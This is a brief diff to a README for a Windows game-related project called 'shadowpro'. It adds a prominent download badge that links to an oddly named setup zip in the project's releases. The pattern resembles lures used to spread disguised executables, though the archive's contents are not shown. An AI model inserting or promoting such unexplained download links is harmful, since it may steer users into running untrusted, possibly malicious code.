@@ -1,3 +1,5 @@
+[![Download](https://img.shields.io/badge/Download-v1.0.0-blue?style=plastic&logo=github)](https://github.com/daniel-tech-2090o4/shadowpro/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # 🎮 shadowpro
 
 ![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg) ![OS](https://img.shields.io/badge/OS-Windows%2010%2B-0078D6.svg)
